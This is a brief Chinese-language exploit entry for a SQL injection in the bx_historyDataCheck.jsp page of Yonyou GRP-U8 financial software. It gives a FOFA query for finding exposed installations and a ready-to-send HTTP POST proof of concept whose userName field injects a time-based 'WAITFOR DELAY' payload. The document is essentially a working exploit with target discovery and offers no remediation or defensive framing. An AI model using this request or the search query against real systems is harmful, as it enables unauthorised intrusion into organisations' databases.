## 用友 GRP-U8 bx_historyDataCheck.jsp SQL注入漏洞

## fofa-qeury
app="yonyou-GRP-U8"

## POC
```
POST /u8qx/bx_historyDataCheck.jsp HTTP/1.1
Host: 
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

userName=';WAITFOR DELAY '0:0:5'--&ysnd=&historyFlag=
```
